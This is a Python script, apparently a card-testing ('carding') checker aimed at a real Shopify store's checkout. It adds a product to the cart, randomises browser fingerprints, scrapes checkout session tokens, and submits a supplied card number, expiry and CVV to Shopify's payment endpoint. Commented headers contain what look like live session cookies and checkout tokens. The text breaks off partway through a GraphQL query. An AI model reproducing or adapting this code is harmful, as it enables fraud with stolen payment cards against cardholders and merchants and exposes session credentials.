import asyncio
import httpx
import requests
import re
import json
import csv
import random

def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return None

async def create_shopify_charge(card, mes, ano, cvv, session):
          try:
              user = f"Mozilla/5.0 (Windows NT {random.randint(11, 99)}.0; Win64; x64) AppleWebKit/{random.randint(111, 999)}.{random.randint(11, 99)} (KHTML, like Gecko) Chrome/{random.randint(11, 99)}.0.{random.randint(1111, 9999)}.{random.randint(111, 999)} Safari/{random.randint(111, 999)}.{random.randint(11, 99)}"
              print("FBI FBI")
              headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://shedknives.com',
                'priority': 'u=1, i',
                'referer': 'https://shedknives.com/products/2024-sk-decal',
                'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'secure_customer_sig=; _shopify_y=137582F9-7f26-4960-b5db-2b0d67119e8d; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22m%22%3A%22%22%2C%22p%22%3A%22%22%2C%22s%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22region%22%3A%22INGJ%22%2C%22reg%22%3A%22%22%2C%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%2C%22consent_id%22%3A%226BE6A551-868c-48FD-a7e2-b9ab490a7f62%22%7D; _orig_referrer=https%3A%2F%2Fbloodxteam.com%2F; _landing_page=%2Fproducts%2Fshed-knives-sticker-1; _fbp=fb.1.1747808756921.239970416511492494; _pin_unauth=dWlkPU4ySmhOR0pqTnpBdE1ETXpZUzAwTlRFMExXRm1aV1V0TVRka1ltSXpNekkxTVRWag; _ga=GA1.1.1946165539.1747808757; omnisend-form-6797ef983f123c4f0ae5081d-closed-at=2025-05-21T06:26:03.175Z; cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ%3Fkey%3D55a5573131047b431b6244ad6287eb98; cart_sig=602181c0c91c05d6321ff19dc2aa9c0c; checkout_session_token__cn__Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ=%7B%22token%22%3A%22AAEB4KXOE6KZvnqLN9zGF7Zf3IbIoIo_UKumZI9fqVtHC2oOAL2G5ayUXIX2sFbiZq5YYB73Fyrc5xAKUT5-GerwGBQMw2-928wHTVTZcRlVzM0qBZTKEQlKXgw6_7fVEOosoqm9AAiOxklztiRDB6gTZldEPa9Gq3CvEdji_38gDbDoJFCc4MgCuzTLI51_64KmfE24vKuHCoG5yslgsNQpDWxMuJtBgvvsbuwQbdvnost_Ufr4MrWUCm8OBLP2nl4W_w%22%2C%22locale%22%3A%22en-IN%22%2C%22checkout_session_identifier%22%3A%226a1c1836c48ae06e9b10ba44d9aec215%22%7D; checkout_session_lookup=%7B%22version%22%3A1%2C%22keys%22%3A%5B%7B%22source_id%22%3A%22Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ%22%2C%22checkout_session_identifier%22%3A%226a1c1836c48ae06e9b10ba44d9aec215%22%2C%22source_type_abbrev%22%3A%22cn%22%2C%22updated_at%22%3A%222025-05-21T06%3A29%3A28.068Z%22%7D%5D%7D; skip_shop_pay=false; omnisendContactID=682d72f05cbef8fabb3a2746; hide_shopify_pay_for_checkout=false; _shopify_essential=:AZbxiF2iAAEAcZuzlsrzA7wxIjBp12CT5Ul_SLu48uuqkIMdxhIFUyaG4B5rLRrQt16RBGPukQ0KcuIL3tzHtXdSHlg7A2v5nnYUzy490HeF3e40zqQzNqjWI75D7SY3R2ogWgOsISXqie1MC7yxQ46kDvSipy8q8hy9aaNevw47rcA0pXkfzxrVMgrUAFSYA_MBnh8iSezS-HNNV60LuuyNza6TkWkRqjDLxKUe-ZZimh9HsaE5tJLQQ_ZvfUWizF62lPSzxWtOuuEqHk2Y2l5BNwK5v6QW9xvdx2yHYVccPCWecJuDs0WJRoNEpPoMy2IhqUEOobTddMjdQX7Pm5ADiH-0KP987r_dtaMD8wbqIxzilqC0kxf_4iev5TC2bCf3ClWLSm4lbss:; cart_currency=USD; _shopify_sa_p=; shopify_pay_redirect=pending; soundestID=20250521170913-HGmge6ThNLITW3MaXa5QPZs0W1Y6kDa4o2E5dcWNZSEPMQEhg; omnisendSessionID=Ych5h10AS0z7MM-20250521170913; omnisendShopifyCart={"41696773669034":1}; localization=US; _shopify_s=33B68418-e829-4984-95ee-7537f5883f33; _shopify_sa_t=2025-05-21T17%3A09%3A37.206Z; page-views=3; _ga_SY9JTQL740=GS2.1.s1747847354$o2$g1$t1747847378$j0$l0$h0; _ga_7XGDR94Y27=GS2.1.s1747847353$o2$g1$t1747847387$j0$l0$h0; keep_alive=eyJ2IjoxLCJ0cyI6MTc0Nzg0NzQwMzAxNywiZW52Ijp7IndkIjowLCJ1YSI6MSwiY3YiOjEsImJyIjoxfSwiYmh2Ijp7Im1hIjo3MiwiY2EiOjAsImthIjowLCJzYSI6MywidCI6MjUsIm5tIjoxLCJ2YyI6MH0sInNlcyI6eyJwIjoxLCJzIjoxNzQ3ODQ3Mzc3Mjk5LCJkIjoyNX19',
            }

              data = {
                'form_type': 'product',
                'utf8': 'âœ“',
                'id': '46284440141994',
                'quantity': '1',
                'product-id': '8028760768682',
                'section-id': 'template--16314355777706__main',
            }

              response = requests.post('https://shedknives.com/cart/add.js', headers=headers, data=data)
              
              request = await session.post('https://shedknives.com/cart/add.js', headers=headers, data=data)

              headers = {
                  'accept': 'application/json, text/javascript, */*; q=0.01',
                  'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
                  'priority': 'u=1, i',
                  'referer': 'https://shedknives.com/products/shed-knives-sticker-1',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?0',
                  'sec-ch-ua-platform': '"Windows"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'same-origin',
                  'user-agent': user,
                  'x-requested-with': 'XMLHttpRequest',
              }

              request = await session.get('https://shedknives.com/cart.js', headers=headers)
              token = request.json()["token"]
              print(token)

              headers = {
                  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                  'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
                  'cache-control': 'max-age=0',
                  'content-type': 'application/x-www-form-urlencoded',
                  'origin': 'https://shedknives.com',
                  'priority': 'u=0, i',
                  'referer': 'https://shedknives.com/cart',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?0',
                  'sec-ch-ua-platform': '"Windows"',
                  'sec-fetch-dest': 'document',
                  'sec-fetch-mode': 'navigate',
                  'sec-fetch-site': 'same-origin',
                  'sec-fetch-user': '?1',
                  'upgrade-insecure-requests': '1',
                  'user-agent': user,
                  # 'cookie': 'secure_customer_sig=; localization=IN; cart_currency=INR; _shopify_y=137582F9-7f26-4960-b5db-2b0d67119e8d; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22m%22%3A%22%22%2C%22p%22%3A%22%22%2C%22s%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22region%22%3A%22INGJ%22%2C%22reg%22%3A%22%22%2C%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%2C%22consent_id%22%3A%226BE6A551-868c-48FD-a7e2-b9ab490a7f62%22%7D; _orig_referrer=https%3A%2F%2Fbloodxteam.com%2F; _landing_page=%2Fproducts%2Fshed-knives-sticker-1; _shopify_sa_p=; shopify_pay_redirect=pending; soundestID=20250521062556-nK9cqF0t47q3ylxncY5L4i9uAeMaEFuNOhVVbrCSxwXSCmueD; omnisendSessionID=GFstRSazqCxHv9-20250521062556; _fbp=fb.1.1747808756921.239970416511492494; _pin_unauth=dWlkPU4ySmhOR0pqTnpBdE1ETXpZUzAwTlRFMExXRm1aV1V0TVRka1ltSXpNekkxTVRWag; _ga=GA1.1.1946165539.1747808757; omnisend-form-6797ef983f123c4f0ae5081d-closed-at=2025-05-21T06:26:03.175Z; cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ%3Fkey%3D55a5573131047b431b6244ad6287eb98; omnisendShopifyCart={"41696773669034":1}; cart_sig=602181c0c91c05d6321ff19dc2aa9c0c; _shopify_s=3F85DFA6-fefc-4B56-bc4d-a0a6cb13e275; _shopify_sa_t=2025-05-21T06%3A27%3A53.784Z; _ga_7XGDR94Y27=GS2.1.s1747808756$o1$g1$t1747808874$j0$l0$h0; _ga_SY9JTQL740=GS2.1.s1747808756$o1$g1$t1747808874$j0$l0$h0; page-views=9; keep_alive=eyJ2IjoxLCJ0cyI6MTc0NzgwODk2NDMzNiwiZW52Ijp7IndkIjowLCJ1YSI6MSwiY3YiOjEsImJyIjoxfSwiYmh2Ijp7Im1hIjoxMSwiY2EiOjAsImthIjowLCJzYSI6MCwidCI6ODksIm5tIjoxLCJ2YyI6MH0sInNlcyI6eyJwIjoxMCwicyI6MTc0NzgwODc1NjMyMiwiZCI6MTk2fX0%3D',
              }

              data = {
                  'checkout': '',
                  'updates[]': '1',
                  'address[country]': 'United States',
                  'address[province]': 'Alabama',
                  'address[zip]': '',
              }

              request = await session.post('https://shedknives.com/cart', follow_redirects=True, headers=headers, data=data)
              print(request)
              x_checkout_one_session_token = find_between(request.text, 'serialized-session-token" content="&quot;', '&quot;"')
              queue_token                  = find_between(request.text, 'queueToken&quot;:&quot;', '&quot;')
              stable_id                    = find_between(request.text, 'stableId&quot;:&quot;', '&quot;')
              paymentMethodIdentifier      = find_between(request.text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

              # print(x_checkout_one_session_token)
              # print(queue_token)
              # print(stable_id)
              # print(paymentMethodIdentifier)

              headers = {
                  'accept': 'application/json',
                  'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
                  'content-type': 'application/json',
                  'origin': 'https://checkout.pci.shopifyinc.com',
                  'priority': 'u=1, i',
                  'referer': 'https://checkout.pci.shopifyinc.com/build/61a2adc/number-ltr.html?identifier=&locationURL=',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?0',
                  'sec-ch-ua-platform': '"Windows"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'same-origin',
                  'sec-fetch-storage-access': 'active',
                  'user-agent': user,
              }

              json_data = {
                  'credit_card': {
                      'number': card,
                      'month': int(mes),
                      'year': int(ano),
                      'verification_value': cvv,
                      'start_month': int(mes),
                      'start_year': int(ano),
                      'issue_number': card,
                      'name': 'SHK GAMING',
                  },
                  'payment_session_scope': 'shedknives.com',
              }

              request = await session.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data)
              sessionid = request.json()["id"]
              # print(sessionid)

              headers = {
    'accept': 'application/json',
    'accept-language': 'en-IN',
    'content-type': 'application/json',
    'origin': 'https://shedknives.com',
    'priority': 'u=1, i',
    'referer': 'https://shedknives.com/',
    'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'shopify-checkout-client': 'checkout-web/1.0',
    'user-agent': user,
    'x-checkout-one-session-token': x_checkout_one_session_token,
    'x-checkout-web-build-id': '2cc80faca885ade9db1085b81b6b927c893b6162',
    'x-checkout-web-deploy-stage': 'production',
    'x-checkout-web-server-handling': 'fast',
    'x-checkout-web-server-rendering': 'yes',
    'x-checkout-web-source-id': token,
    # 'cookie': 'secure_customer_sig=; localization=IN; cart_currency=INR; _shopify_y=137582F9-7f26-4960-b5db-2b0d67119e8d; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22m%22%3A%22%22%2C%22p%22%3A%22%22%2C%22s%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22region%22%3A%22INGJ%22%2C%22reg%22%3A%22%22%2C%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%2C%22consent_id%22%3A%226BE6A551-868c-48FD-a7e2-b9ab490a7f62%22%7D; _orig_referrer=https%3A%2F%2Fbloodxteam.com%2F; _landing_page=%2Fproducts%2Fshed-knives-sticker-1; _shopify_sa_p=; shopify_pay_redirect=pending; soundestID=20250521062556-nK9cqF0t47q3ylxncY5L4i9uAeMaEFuNOhVVbrCSxwXSCmueD; omnisendSessionID=GFstRSazqCxHv9-20250521062556; _fbp=fb.1.1747808756921.239970416511492494; _pin_unauth=dWlkPU4ySmhOR0pqTnpBdE1ETXpZUzAwTlRFMExXRm1aV1V0TVRka1ltSXpNekkxTVRWag; _ga=GA1.1.1946165539.1747808757; omnisend-form-6797ef983f123c4f0ae5081d-closed-at=2025-05-21T06:26:03.175Z; cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ%3Fkey%3D55a5573131047b431b6244ad6287eb98; omnisendShopifyCart={"41696773669034":1}; cart_sig=602181c0c91c05d6321ff19dc2aa9c0c; page-views=9; keep_alive=eyJ2IjoxLCJ0cyI6MTc0NzgwODk2NDMzNiwiZW52Ijp7IndkIjowLCJ1YSI6MSwiY3YiOjEsImJyIjoxfSwiYmh2Ijp7Im1hIjoxMSwiY2EiOjAsImthIjowLCJzYSI6MCwidCI6ODksIm5tIjoxLCJ2YyI6MH0sInNlcyI6eyJwIjoxMCwicyI6MTc0NzgwODc1NjMyMiwiZCI6MTk2fX0%3D; checkout_session_token__cn__Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ=%7B%22token%22%3A%22AAEB4KXOE6KZvnqLN9zGF7Zf3IbIoIo_UKumZI9fqVtHC2oOAL2G5ayUXIX2sFbiZq5YYB73Fyrc5xAKUT5-GerwGBQMw2-928wHTVTZcRlVzM0qBZTKEQlKXgw6_7fVEOosoqm9AAiOxklztiRDB6gTZldEPa9Gq3CvEdji_38gDbDoJFCc4MgCuzTLI51_64KmfE24vKuHCoG5yslgsNQpDWxMuJtBgvvsbuwQbdvnost_Ufr4MrWUCm8OBLP2nl4W_w%22%2C%22locale%22%3A%22en-IN%22%2C%22checkout_session_identifier%22%3A%226a1c1836c48ae06e9b10ba44d9aec215%22%7D; checkout_session_lookup=%7B%22version%22%3A1%2C%22keys%22%3A%5B%7B%22source_id%22%3A%22Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ%22%2C%22checkout_session_identifier%22%3A%226a1c1836c48ae06e9b10ba44d9aec215%22%2C%22source_type_abbrev%22%3A%22cn%22%2C%22updated_at%22%3A%222025-05-21T06%3A29%3A28.068Z%22%7D%5D%7D; shop_pay_accelerated=%7B%22universal_redirect%22%3A1747808968%7D; auth_state_01JVRRGR7CSXTAAYTG3JXH7GNJ=c2f7fcc95d12ac452f32729b14ebcd85; skip_shop_pay=false; _shopify_s=3F85DFA6-fefc-4B56-bc4d-a0a6cb13e275; _ga_7XGDR94Y27=GS2.1.s1747808756$o1$g1$t1747808972$j0$l0$h0; _shopify_sa_t=2025-05-21T06%3A29%3A32.550Z; _ga_SY9JTQL740=GS2.1.s1747808756$o1$g1$t1747808974$j0$l0$h0; omnisendContactID=682d72f05cbef8fabb3a2746; hide_shopify_pay_for_checkout=false; _shopify_essential=:AZbxiF2iAAEAsOQvkizIuJuCwKoMZNEArmNZY3hfznx-uBdFTFgF06vuMgT52OR3QjDiryiuA_1nbbU4x13Rii3yQ1suTNFnZBIKU7ttNWSO5g7B6dLF-C30KfCEukbHOAL01GviygSgvOshBOTtUvvHWkkR_I1ebZ8FKPlyWIDgyxjX6LEhjbx1KJ1o9Hy9-RmMLdhVdefAWDj3CUZbgTnA9P9Y5xA7DNAUSk4i6sIgok3OccWXlWXLPSHNw2Ve-6nCwUsOdmF8feb8aPePDmxe7YAwG1E_eil4UTBsgK7GFYjj6iWeZ3-qJ978Ac20-obHlKid_rJcXSLLXMgzzqePAy7k4I23C2qDl-q7RT78l_FX0CeMllZqAICDsXyvKKgg8-1QohTxg_s:',
}

              params = {
    'operationName': 'Proposal',
}

              json_data = {
    'query': 'query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions,cartMetafields:$cartMetafields,memberships:$memberships},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename reportable}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode 